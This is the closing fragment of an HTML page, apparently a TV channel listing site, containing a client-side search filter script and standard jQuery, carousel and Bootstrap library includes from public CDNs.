                style="padding-left: 25px; padding-right: 25px; padding-top: 10px;font-weight:1000; padding-bottom: 10px;width:50%"
                class="btn-11 custom-btn"> Made By @sanjiblive</button></div></a> 
        <br><br><br>
    </center>



    <script>
    document.addEventListener('DOMContentLoaded', function () {
        // Get the input element for searching
        const searchInput = document.getElementById('look_tv_here');
        const tvvItemContainers = document.querySelectorAll('.tvv-item'); // Get all TVV item containers

        // Store the initial display property of TVV item containers
        const initialDisplayProperties = [];
        tvvItemContainers.forEach(function (container) {
            initialDisplayProperties.push(window.getComputedStyle(container).display);
        });

        // Add an event listener for the input element
        searchInput.addEventListener('input', function () {
            const searchTerm = searchInput.value.trim().toLowerCase();

            // Loop through each TVV item container and check if it contains the search term
            tvvItemContainers.forEach(function (container, index) {
                const tvvNameElement = container.querySelector('.tvv-name');
                const tvvName = tvvNameElement.textContent.trim().toLowerCase();

                if (tvvName.includes(searchTerm)) {
                    container.style.display = initialDisplayProperties[index]; // Restore the initial display property
                } else {
                    container.style.display = 'none'; // Hide non-matching containers
                }
            });
        });
    });
</script>



    <div class="stwRainbow"></div>
    <div class="stwBlurRainbow"></div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap%405.2.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
        crossorigin="anonymous"></script>



</body>


</html>